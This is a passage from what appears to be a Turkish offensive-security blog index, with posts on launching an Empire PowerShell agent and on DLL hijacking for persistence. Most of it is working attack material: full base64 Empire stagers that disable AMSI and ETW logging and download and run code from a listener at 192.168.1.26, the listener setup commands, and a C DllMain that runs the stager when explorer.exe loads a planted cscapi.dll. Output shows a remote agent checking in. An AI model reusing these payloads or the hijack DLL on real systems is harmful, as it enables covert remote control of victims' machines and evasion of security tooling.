ZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABrAEEATQBnAEEAdQBBAEQARQBBAE4AZwBBADQAQQBDADQAQQBNAFEAQQB1AEEARABJAEEATgBnAEEANgBBAEQAawBBAE8AUQBBAHkAQQBEAGsAQQAnACkAKQApADsAJAB0AD0AJwAvAG4AZQB3AHMALgBwAGgAcAAnADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AGMALgBQAHIAbwB4AHkAPQBbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5ADsAJAB3AGMALgBQAHIAbwB4AHkALgBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AQwByAGUAZABlAG4AdABpAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAGYAYQB1AGwAdABOAGUAdAB3AG8AcgBrAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAB3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAnAFUARgBYADwARwA5AEAAKQBzAF0AbQB8AFYATQArAEgAXwB9AFIAcgAhAEkAdwA2ACYAaQBnAGsARAAtAD4ANAAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AG4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAHgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAYgBKAG4AWQBLAGoARQBXAFcATQB2AGMAUwBsAEQAPQBhAEgAQwAvADAASABsADcASQBWAHYAcABZAGsAdQA1ACsANwBVADQAYgBxAEEAWQB2AEsAdwA9ACIAKQA7ACQAZABhAHQAYQA9ACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAdgA9ACQAZABhAHQAYQBbADAALgAuADMAXQA7ACQAZABhAHQAYQA9ACQAZABhAHQAYQBbADQALgAuACQAZABhAHQAYQAuAGwAZQBuAGcAdABoAF0AOwAtAGoAbwBpAG4AWwBDAGgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABhAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA(Empire: usestager/multi_launcher) &gt;Elde edilen payload istemci cihazda çalıştırılırPS C:\\Windows\\system32&gt; $object.CreateObject(\"Shell.Application\").ShellExecute(\"C:\\Windows\\System32\\cmd.exe\", 'rundll32 SHELL32.DLL,ShellExec_RunDLL \"cmd.exe\" \"/c powershell -ep bypass -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABrAEEATQBnAEEAdQBBAEQARQBBAE4AZwBBADQAQQBDADQAQQBNAFEAQQB1AEEARABJAEEATgBnAEEANgBBAEQAawBBAE8AUQBBAHkAQQBEAGsAQQAnACkAKQApADsAJAB0AD0AJwAvAG4AZQB3AHMALgBwAGgAcAAnADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AGMALgBQAHIAbwB4AHkAPQBbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5ADsAJAB3AGMALgBQAHIAbwB4AHkALgBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AQwByAGUAZABlAG4AdABpAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAGYAYQB1AGwAdABOAGUAdAB3AG8AcgBrAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAB3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAnAFUARgBYADwARwA5AEAAKQBzAF0AbQB8AFYATQArAEgAXwB9AFIAcgAhAEkAdwA2ACYAaQBnAGsARAAtAD4ANAAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AG4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAHgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAYgBKAG4AWQBLAGoARQBXAFcATQB2AGMAUwBsAEQAPQBhAEgAQwAvADAASABsADcASQBWAHYAcABZAGsAdQA1ACsANwBVADQAYgBxAEEAWQB2AEsAdwA9ACIAKQA7ACQAZABhAHQAYQA9ACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAdgA9ACQAZABhAHQAYQBbADAALgAuADMAXQA7ACQAZABhAHQAYQA9ACQAZABhAHQAYQBbADQALgAuACQAZABhAHQAYQAuAGwAZQBuAGcAdABoAF0AOwAtAGoAbwBpAG4AWwBDAGgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABhAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\"', '', '',1)[+] New agent X64E7CGW checked in(9PMBF5HU)  &gt; interact X64E7CGW(Empire: X64E7CGW) &gt; shellINFO: Exit Shell Menu with Ctrl+C (X64E7CGW) C:\\Windows\\System32 &gt; whoamiZEDELEYICI\\zedel"
  },
  
  {
    "title": "DLL Hijacking",
    "url": "/posts/dll-hijacking/",
    "categories": "persistence",
    "tags": "dll, privesc, movement",
    "date": "2023-07-11 00:00:00 +0300",
    





    
    "snippet": "Temelde executable dosyaların çalışırken, ek olarak veya zorunlu olarak ihtiyaç duydukları bazı dinamik kütüphanelerdir. Bulunması durumunda uygulama ek hizmetler sunabilir veya sunmayabilir tamame...",
    "content": "Temelde executable dosyaların çalışırken, ek olarak veya zorunlu olarak ihtiyaç duydukları bazı dinamik kütüphanelerdir. Bulunması durumunda uygulama ek hizmetler sunabilir veya sunmayabilir tamamen uygulamaya bağlı.Procmon ile çalışan dosyaların tüm hareketlerini izleyebiliyoruz. Bu özellik dll aramak için kullanılabilir.Hedefimiz: C:\\Windows\\SystemApps\\MicrosoftWindows.Client.Core_cw5n1h2txyewy\\cscapi.dllEmpire ile powershell payloadı üretilir. Bu payload, explorer.exe çalıştığı zaman aktif olacak ve kurban tarafından reverse shell alacağız.(Empire: uselistener/http) &gt; set Name dllhijackerINFO: Set Name to dllhijacker (Empire: uselistener/http) &gt; set Host 192.168.1.26INFO: Set Host to 192.168.1.26 (Empire: uselistener/http) &gt; set Port 9929INFO: Set Port to 9929 (Empire: uselistener/http) &gt; execute[+] Listener dllhijacker successfully started(Empire: uselistener/http) &gt; back(Empire) &gt; usestager multi_launcher id           multi_launcher                                         authors      Will Schroeder, @harmj0y, https://twitter.com/harmj0y  description  Generates a one-liner stage0 launcher for Empire.     ┌Record Options────┬────────────────────┬──────────┬─────────────────────────────────────┐│ Name             │ Value              │ Required │ Description                         │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ Listener         │                    │ True     │ Listener to generate stager for.    │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ Language         │ powershell         │ True     │ Language of the stager to generate. │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ StagerRetries    │ 0                  │ False    │ Times for the stager to retry       ││                  │                    │          │ connecting.                         │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ OutFile          │                    │ False    │ Filename that should be used for    ││                  │                    │          │ the generated output.               │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ Base64           │ True               │ True     │ Switch. Base64 encode the output.   │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ Obfuscate        │ False              │ False    │ Switch. Obfuscate the launcher      ││                  │                    │          │ powershell code, uses the           ││                  │                    │          │ ObfuscateCommand for obfuscation    ││                  │                    │          │ types. For powershell only.         │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ ObfuscateCommand │ Token\\All\\1        │ False    │ The Invoke-Obfuscation command to   ││                  │                    │          │ use. Only used if Obfuscate switch  ││                  │                    │          │ is True. For powershell only.       │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ SafeChecks       │ True               │ True     │ Switch. Checks for LittleSnitch or  ││                  │                    │          │ a SandBox, exit the staging process ││                  │                    │          │ if true. Defaults to True.          │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ UserAgent        │ default            │ False    │ User-agent string to use for the    ││                  │                    │          │ staging request (default, none, or  ││                  │                    │          │ other).                             │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ Proxy            │ default            │ False    │ Proxy to use for request (default,  ││                  │                    │          │ none, or other).                    │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ ProxyCreds       │ default            │ False    │ Proxy credentials                   ││                  │                    │          │ ([domain\\]username:password) to use ││                  │                    │          │ for request (default, none, or      ││                  │                    │          │ other).                             │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ Bypasses         │ mattifestation etw │ False    │ Bypasses as a space separated list  ││                  │                    │          │ to be prepended to the launcher     │└──────────────────┴────────────────────┴──────────┴─────────────────────────────────────┘(Empire: usestager/multi_launcher) &gt; set Listener dllhijackerINFO: Set Listener to dllhijacker (Empire: usestager/multi_launcher) &gt; executeINFO: Stager copied to clipboard powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABrAEEATQBnAEEAdQBBAEQARQBBAE4AZwBBADQAQQBDADQAQQBNAFEAQQB1AEEARABJAEEATgBnAEEANgBBAEQAawBBAE8AUQBBAHkAQQBEAGsAQQAnACkAKQApADsAJAB0AD0AJwAvAG4AZQB3AHMALgBwAGgAcAAnADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AGMALgBQAHIAbwB4AHkAPQBbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5ADsAJAB3AGMALgBQAHIAbwB4AHkALgBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AQwByAGUAZABlAG4AdABpAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAGYAYQB1AGwAdABOAGUAdAB3AG8AcgBrAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAB3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAnAFUARgBYADwARwA5AEAAKQBzAF0AbQB8AFYATQArAEgAXwB9AFIAcgAhAEkAdwA2ACYAaQBnAGsARAAtAD4ANAAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AG4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAHgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAYgBKAG4AWQBLAGoARQBXAFcATQB2AGMAUwBsAEQAPQBhAEgAQwAvADAASABsADcASQBWAHYAcABZAGsAdQA1ACsANwBVADQAYgBxAEEAWQB2AEsAdwA9ACIAKQA7ACQAZABhAHQAYQA9ACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAdgA9ACQAZABhAHQAYQBbADAALgAuADMAXQA7ACQAZABhAHQAYQA9ACQAZABhAHQAYQBbADQALgAuACQAZABhAHQAYQAuAGwAZQBuAGcAdABoAF0AOwAtAGoAbwBpAG4AWwBDAGgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABhAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA  hijack.c#include &lt;windows.h&gt;BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {    switch (ul_reason_for_call)  {    case DLL_PROCESS_ATTACH:      system(\"powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABrAEEATQBnAEEAdQBBAEQARQBBAE4AZwBBADQAQQBDADQAQQBNAFEAQQB1AEEARABJAEEATgBnAEEANgBBAEQAawBBAE8AUQBBAHkAQQBEAGsAQQAnACkAKQApADsAJAB0AD0AJwAvAG4AZQB3AHMALgBwAGgAcAAnADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AGMALgBQAHIAbwB4AHkAPQBbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5ADsAJAB3AGMALgBQAHIAbwB4AHkALgBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AQwByAGUAZABlAG4AdABpAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAGYAYQB1AGwAdABOAGUAdAB3AG8AcgBrAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAB3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAnAFUARgBYADwARwA5AEAAKQBzAF0AbQB8AFYATQArAEgAXwB9AFIAcgAhAEkAdwA2ACYAaQBnAGsARAAtAD4ANAAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AG4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAHgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAYgBKAG4AWQBLAGoARQBXAFcATQB2AGMAUwBsAEQAPQBhAEgAQwAvADAASABsADcASQBWAHYAcABZAGsAdQA1ACsANwBVADQAYgBxAEEAWQB2AEsAdwA9ACIAKQA7ACQAZABhAHQAYQA9ACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAdgA9ACQAZABhAHQAYQBbADAALgAuADMAXQA7ACQAZABhAHQAYQA9ACQAZABhAHQAYQBbADQALgAuACQAZABhAHQAYQAuAGwAZQBuAGcAdABoAF0AOwAtAGoAbwBpAG4AWwBDAGgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABhAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\");      break;    case DLL_PROCESS_DETACH:      break;    case DLL_THREAD_ATTACH:      break;    case DLL_THREAD_DETACH:      break;    }    return TRUE;}  DLL kaynak kodu 